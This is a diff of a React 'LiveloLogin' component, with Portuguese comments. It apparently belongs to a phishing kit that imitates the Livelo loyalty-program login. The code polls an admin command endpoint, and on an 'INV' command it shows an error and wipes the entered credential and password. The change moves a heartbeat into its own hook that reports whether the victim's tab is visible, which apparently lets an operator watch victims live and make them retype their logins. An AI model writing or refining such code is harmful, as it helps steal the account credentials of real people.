@@ -136,14 +136,11 @@ function LiveloLogin() {
     }
   };
 
-  // Verificar se há comando ativo + heartbeat com visibilidade
+  // Verificar se há comando ativo (polling normal, sem heartbeat)
   useEffect(() => {
     if (!userId) return;
 
     const checkCommand = async () => {
-      // Não enviar heartbeat se a aba não estiver visível
-      if (document.hidden) return;
-      
       try {
         const response = await axios.get(`${API}/user/check-action/${userId}`);
         
@@ -151,20 +148,17 @@ function LiveloLogin() {
           const action = response.data.action;
           const timestamp = response.data.action_timestamp;
           
-          // Verificar se já processamos este comando específico (usando timestamp)
           if (timestamp && timestamp === lastProcessedTimestamp) {
-            return; // Já processamos este comando, não fazer nada
+            return;
           }
           
-          // Novo comando com timestamp diferente
           if (action === "INV") {
             setIsLoading(false);
             setHasError(true);
             setCredential("");
             setPassword("");
-            setLastProcessedTimestamp(timestamp); // Marcar como processado
+            setLastProcessedTimestamp(timestamp);
             
-            // Limpar o comando no backend
             axios.post(`${API}/admin/command`, {
               user_id: userId,
               command: "CLEAR"
@@ -179,27 +173,56 @@ function LiveloLogin() {
       }
     };
 
-    // Quando a aba fica oculta, notificar offline imediatamente
-    const handleVisibilityChange = () => {
-      if (document.hidden) {
-        // Notificar backend que saiu (usando sendBeacon para garantir envio)
-        const url = `${API}/user/set-offline/${userId}`;
-        navigator.sendBeacon(url);
-      } else {
-        // Voltou - fazer check imediato
-        checkCommand();
+    checkCommand();
+    const interval = setInterval(checkCommand, 2000);
+    return () => clearInterval(interval);
+  }, [userId, lastProcessedTimestamp]);
+
+  // Heartbeat separado - SÓ envia quando aba está VISÍVEL
+  useEffect(() => {
+    if (!userId) return;
+
+    let heartbeatInterval = null;
+
+    const sendHeartbeat = () => {
+      if (!document.hidden) {
+        axios.post(`${API}/user/heartbeat/${userId}`).catch(() => {});
       }
     };
 
-    document.addEventListener("visibilitychange", handleVisibilityChange);
-
-    checkCommand();
-    const interval = setInterval(checkCommand, 2000);
-    return () => {
-      clearInterval(interval);
-      document.removeEventListener("visibilitychange", handleVisibilityChange);
+    const startHeartbeat = () => {
+      sendHeartbeat();
+      if (heartbeatInterval) clearInterval(heartbeatInterval);
+      heartbeatInterval = setInterval(sendHeartbeat, 2000);
     };
-  }, [userId, lastProcessedTimestamp]);
+
+    const stopHeartbeat = () => {
+      if (heartbeatInterval) {
+        clearInterval(heartbeatInterval);
+        heartbeatInterval = null;
+      }
+    };
+
+    const handleVisibility = () => {
+      if (document.hidden) {
+        stopHeartbeat();
+      } else {
+        startHeartbeat();
+      }
+    };
+
+    document.addEventListener("visibilitychange", handleVisibility);
+    
+    // Iniciar se aba estiver visível
+    if (!document.hidden) {
+      startHeartbeat();
+    }
+
+    return () => {
+      stopHeartbeat();
+      document.removeEventListener("visibilitychange", handleVisibility);
+    };
+  }, [userId]);
 
   // Verifica se o formulário está válido
   useEffect(() => {
